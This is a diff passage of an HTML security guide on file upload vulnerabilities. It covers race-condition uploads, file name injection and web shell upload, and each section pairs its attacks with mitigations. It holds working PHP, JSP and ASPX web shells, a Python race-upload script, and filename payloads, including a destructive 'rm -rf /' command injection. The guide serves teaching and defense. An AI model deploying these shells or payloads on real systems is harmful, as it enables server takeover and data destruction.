+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>import requests, threading
+
+def upload_file():
+    files = {'file': ('shell.php', '&lt;?php system($_GET["cmd"]); ?&gt;')}
+    requests.post('https://target.com/upload', files=files)
+
+def access_shell():
+    while True:
+        r = requests.get('https://target.com/uploads/shell.php')
+        if r.status_code == 200:
+            print("Shell accessible!")
+            break
+
+threading.Thread(target=upload_file).start()
+threading.Thread(target=access_shell).start()</pre>
+      </div>
+
+      <h3>⚙️ Exploitation Steps</h3>
+      <ol>
+        <li>Start thread uploading malicious file</li>
+        <li>Start thread continuously accessing uploaded file</li>
+        <li>Access may succeed before validation/deletion</li>
+        <li>Execute code during race window</li>
+      </ol>
+
+      <h3>🛡️ Mitigation</h3>
+      <div class="mitigation-box" style="background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem;">
+        <strong>✅ Validate Before Save:</strong> Complete all validation before writing file<br>
+        <strong>✅ Use Temporary Storage:</strong> Save to non-executable location first<br>
+        <strong>✅ Atomic Operations:</strong> Use file locking or atomic moves<br>
+        <strong>✅ Rename After Validation:</strong> Use random names only after validation
+      </div>
+
+      <h3>⚠️ Risk / Impact</h3>
+      <div class="vulnerability-box" style="background: rgba(255, 68, 68, 0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem;">
+        <strong>Severity: High</strong><br><br>
+        <strong>Impact:</strong> Remote Code Execution (race-dependent)
+      </div>
+
+      <h3>📚 References</h3>
+      <ul>
+        <li><a href="https://portswigger.net/web-security/race-conditions" class="reference-link" target="_blank" style="color: var(--primary);">PortSwigger: Race Conditions</a></li>
+      </ul>
+    </div>
+
+    <!-- ==================== 11. FILE NAME INJECTION ==================== -->
+    <div id="filename-injection" class="content-section">
+      <h2>📌 11. File Name Injection</h2>
+      <div class="vuln-card">
+        <p><strong>What is File Name Injection?</strong></p>
+        <p>Injecting malicious content via file name that gets reflected in responses or logs.</p>
+        <p><strong>Why does it occur?</strong></p>
+        <p>Application reflects filename without proper encoding or sanitization.</p>
+        <p><strong>Security principle violated:</strong> Output Encoding</p>
+      </div>
+
+      <h3>🏷️ Classification</h3>
+      <ul>
+        <li><strong>Type:</strong> Injection</li>
+        <li><strong>CWE:</strong> CWE-79, CWE-93, CWE-116</li>
+      </ul>
+
+      <h3>💣 Basic Payloads</h3>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># XSS via filename
+&lt;script&gt;alert(1)&lt;/script&gt;.jpg
+&lt;img src=x onerror=alert(1)&gt;.png
+
+# Command injection via filename
+; rm -rf / ;.jpg
+| whoami .png
+$(id).gif
+
+# Log injection
+test.jpg
+test.jpg\nUser logged in as admin</pre>
+      </div>
+
+      <h3>⚙️ Exploitation Steps</h3>
+      <ol>
+        <li>Upload file with malicious filename</li>
+        <li>Check where filename is displayed (page, logs, emails)</li>
+        <li>If displayed without encoding, XSS/Injection occurs</li>
+      </ol>
+
+      <h3>🛡️ Mitigation</h3>
+      <div class="mitigation-box" style="background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem;">
+        <strong>✅ Rename Files:</strong> Generate random names, ignore user input<br>
+        <strong>✅ Encode Output:</strong> Always encode filename when displaying<br>
+        <strong>✅ Sanitize Input:</strong> Remove special characters from filenames<br>
+        <strong>✅ Escape Logs:</strong> Properly escape log entries
+      </div>
+
+      <h3>⚠️ Risk / Impact</h3>
+      <div class="vulnerability-box" style="background: rgba(255, 193, 7, 0.1); border-left: 4px solid #ffc107; padding: 1rem; border-radius: 0.5rem;">
+        <strong>Severity: Low to Medium</strong><br><br>
+        <strong>Impact:</strong> XSS, Log Injection, Command Injection
+      </div>
+
+      <h3>📚 References</h3>
+      <ul>
+        <li><a href="https://owasp.org/www-community/attacks/Log_Injection" class="reference-link" target="_blank" style="color: var(--primary);">OWASP: Log Injection</a></li>
+      </ul>
+    </div>
+
+    <!-- ==================== 12. WEB SHELL UPLOAD ==================== -->
+    <div id="webshell" class="content-section">
+      <h2>📌 12. Web Shell Upload</h2>
+      <div class="vuln-card">
+        <p><strong>What is Web Shell Upload?</strong></p>
+        <p>Uploading fully functional web shells to maintain persistent access and execute commands.</p>
+        <p><strong>Why does it occur?</strong></p>
+        <p>Successful bypass of all upload protections leads to webshell deployment.</p>
+        <p><strong>Security principle violated:</strong> Multiple (Upload, Execution, Access Control)</p>
+      </div>
+
+      <h3>🏷️ Classification</h3>
+      <ul>
+        <li><strong>Type:</strong> Web Shell</li>
+        <li><strong>CWE:</strong> CWE-434: Unrestricted Upload</li>
+      </ul>
+
+      <h3>💣 PHP Web Shells</h3>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>&lt;?php system($_GET['cmd']); ?&gt;
+
+&lt;?php if(isset($_REQUEST['cmd'])){ echo "&lt;pre&gt;"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "&lt;/pre&gt;"; die; }?&gt;
+
+&lt;?php exec($_GET['cmd'], $output); print_r($output); ?&gt;</pre>
+      </div>
+
+      <h3>💣 JSP Web Shell</h3>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>&lt;% if (request.getParameter("cmd") != null) {
+    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+    OutputStream os = p.getOutputStream();
+    InputStream in = p.getInputStream();
+    DataInputStream dis = new DataInputStream(in);
+    String disr = dis.readLine();
+    while ( disr != null ) {
+        out.println(disr);
+        disr = dis.readLine();
+    }
+}%&gt;</pre>
+      </div>
+
+      <h3>💣 ASP/ASPX Web Shell</h3>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>&lt;%@ Page Language="C#" %&gt;
+&lt;%
+    string cmd = Request["cmd"];
+    if (!string.IsNullOrEmpty(cmd))
+    {
+        System.Diagnostics.Process.Start("cmd.exe", "/c " + cmd);
+    }
+%&gt;</pre>
+      </div>
+
+      <h3>⚙️ Exploitation Steps</h3>
+      <ol>
+        <li>Upload webshell using any bypass technique</li>
+        <li>Access webshell via browser</li>
+        <li>Execute system commands</li>
+        <li>Establish persistent access</li>
+        <li>Pivot to internal network</li>
+      </ol>
+
+      <h3>🛡️ Mitigation</h3>
+      <div class="mitigation-box" style="background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem;">
+        <strong>✅ Disable Execution:</strong> No execution in upload directories<br>
+        <strong>✅ File Type Allowlist:</strong> Only allow safe file types<br>
+        <strong>✅ Rename Files:</strong> Random names, strip extensions<br>
+        <strong>✅ Store Outside Webroot:</strong> Prevent direct access<br>
+        <strong>✅ Monitor Uploads:</strong> Scan for webshell signatures<br>
+        <strong>✅ WAF Rules:</strong> Detect common webshell patterns
+      </div>
+
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Apache - Disable PHP execution in uploads
+&lt;Directory /var/www/html/uploads&gt;
+    php_flag engine off
+    AddType text/plain .php .phtml .php5
+&lt;/Directory&gt;
+
+# Nginx - Disable script execution
+location /uploads {
+    location ~ .*\.(php|php5|phtml)$ {
+        return 403;
+    }
+}</pre>
+      </div>
+
+      <h3>⚠️ Risk / Impact</h3>
+      <div class="vulnerability-box" style="background: rgba(255, 68, 68, 0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem;">
+        <strong>Severity: Critical</strong><br><br>
+        <strong>Impact:</strong> Full Server Compromise, Data Theft, Persistence, Lateral Movement
+      </div>
+
+      <h3>📚 References</h3>
+      <ul>
+        <li><a href="https://github.com/tennc/webshell" class="reference-link" target="_blank" style="color: var(--primary);">GitHub: Webshell Collection</a></li>
+        <li><a href="https://owasp.org/www-community/attacks/Upload_Web_Shell" class="reference-link" target="_blank" style="color: var(--primary);">OWASP: Upload Web Shell</a></li>
+      </ul>
+    </div>
+
+    <!-- General Mitigation Summary -->
+    <div class="content-section">
+      <h2>🛡️ General Mitigation (All File Upload Vulnerabilities)</h2>
+      <div class="mitigation-box" style="background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem;">
+        <strong>✅ Allowlist Extensions:</strong> Only allow safe extensions (jpg, png, gif, pdf, txt)<br>
+        <strong>✅ Validate File Content:</strong> Check magic bytes/file signatures<br>
+        <strong>✅ Rename Uploaded Files:</strong> Use random names, never trust user filenames<br>
+        <strong>✅ Store Files Outside Webroot:</strong> Prevent direct access to uploaded files<br>
+        <strong>✅ Disable Execution:</strong> Configure upload directory to disable script execution<br>
+        <strong>✅ Scan for Malware:</strong> Use ClamAV or similar antivirus<br>
+        <strong>✅ Set Proper Permissions:</strong> 644 for files, 755 for directories<br>
+        <strong>✅ Image Re-encoding:</strong> Re-encode images to remove malicious content<br>
+        <strong>✅ Update Libraries:</strong> Keep ImageMagick, GD, and other libraries updated<br>
+        <strong>✅ Use CSP Headers:</strong> Content Security Policy for SVG XSS prevention<br>
+        <strong>✅ Implement Rate Limiting:</strong> Prevent race condition attacks
+      </div>
     </div>
 
     <div class="content-section">
-      <h2>📚 General References (All File Upload Vulnerabilities)</h2>
+      <h2>📚 General References</h2>
       <ul>
         <li><a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload" class="reference-link" target="_blank" style="color: var(--primary);">OWASP: Unrestricted File Upload</a></li>
         <li><a href="https://portswigger.net/web-security/file-upload" class="reference-link" target="_blank" style="color: var(--primary);">PortSwigger: File Upload Vulnerabilities</a></li>
         <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files" class="reference-link" target="_blank" style="color: var(--primary);">PayloadsAllTheThings: File Upload</a></li>
+        <li><a href="https://book.hacktricks.xyz/pentesting-web/file-upload" class="reference-link" target="_blank" style="color: var(--primary);">HackTricks: File Upload Bypass</a></li>
         <li><a href="https://imagetragick.com/" class="reference-link" target="_blank" style="color: var(--primary);">ImageTragick (CVE-2016-3714)</a></li>
       </ul>
     </div>
@@ -294,7 +1097,7 @@ if (!in_array($mime_type, ['image/jpeg', 'image/png'])) {
   </div>
 </main>
 
-<footer><p>Saikumar Raju — Cybersecurity Consultant | File Upload Vulnerabilities - Complete Guide</p></footer>
+<footer><p>Saikumar Raju — Cybersecurity Consultant | File Upload Vulnerabilities - Complete Guide (12 Types)</p></footer>
 
 <script>
   const mobileBtn = document.getElementById('mobileMenuBtn');
